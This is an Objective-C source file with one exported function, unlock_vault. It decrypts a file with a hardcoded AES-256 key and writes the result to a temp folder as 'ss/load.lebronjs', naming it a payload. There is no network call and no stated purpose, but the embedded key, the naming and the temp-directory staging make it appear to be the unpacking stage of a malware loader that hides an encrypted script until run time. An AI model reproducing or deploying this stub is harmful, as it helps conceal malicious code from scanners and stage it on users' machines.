#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonCrypto.h>

static const uint8_t strong_key[32] = {
    0xF1,0x3E,0x5A,0x80,0x9D,0x29,0xC1,0x6B,0x3D,0xD8,0xA4,0x17,0x6A,0xF5,0x58,0x01,
    0xC6,0x82,0x02,0x36,0x4D,0xD3,0xB9,0xC5,0xFB,0x13,0x09,0x8B,0x75,0x07,0x33,0x71
};

__attribute__((visibility("default"))) 
const char* unlock_vault(const char* w_file_path) {
    NSString *wPath = [NSString stringWithUTF8String:w_file_path];
    NSData *wData = [NSData dataWithContentsOfFile:wPath];
    
    if (!wData || wData.length <= 16) return NULL;
    
    NSData *iv = [wData subdataWithRange:NSMakeRange(0, 16)];
    NSData *ct = [wData subdataWithRange:NSMakeRange(16, wData.length - 16)];

    NSMutableData *decrypted = [NSMutableData dataWithLength:ct.length + kCCBlockSizeAES128];
    size_t moved = 0;
    
    CCCryptorStatus status = CCCrypt(kCCDecrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding,
                                     strong_key, kCCKeySizeAES256, iv.bytes,
                                     ct.bytes, ct.length,
                                     decrypted.mutableBytes, decrypted.length,
                                     &moved);
                                     
    if (status == kCCSuccess) {
        decrypted.length = moved;
        
        NSString *tempDir = NSTemporaryDirectory();
        NSString *ssDir = [tempDir stringByAppendingPathComponent:@"ss"];
        [[NSFileManager defaultManager] createDirectoryAtPath:ssDir withIntermediateDirectories:YES attributes:nil error:nil];
        
        NSString *payloadPath = [ssDir stringByAppendingPathComponent:@"load.lebronjs"];
        [decrypted writeToFile:payloadPath atomically:YES];
        
        return strdup([payloadPath UTF8String]);
    }
    
    return NULL;
}
